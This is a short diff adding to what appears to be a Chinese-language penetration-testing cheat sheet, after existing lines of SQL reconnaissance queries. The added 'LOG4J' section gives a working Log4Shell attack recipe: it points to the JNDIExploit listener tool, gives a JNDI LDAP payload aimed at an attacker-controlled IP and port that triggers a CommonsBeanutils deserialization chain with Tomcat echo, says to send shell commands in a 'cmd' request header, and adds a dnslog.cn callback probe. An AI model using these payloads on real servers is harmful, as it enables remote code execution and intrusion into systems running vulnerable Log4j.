@@ -184,9 +184,22 @@ DESKTOP-1HV****---select host_name();
 找Web端IP地址select * from information_schema.PROCESSLIST;
 ```
 
+---
 
+## LOG4J
 
+用这个起监听
+https://github.com/feihong-cs/JNDIExploit
 
+然后回弹地址用
+```
+${jndi:ldap://你的ip:你的端口/Deserialization/CommonsBeanutils2/TomcatEcho}
+```
 
+请求头里带
+cmd: ls
 
-
+就是直接回显的了
+```
+${jndi:ldap://xxx.dnslog.cn/exp}
+```
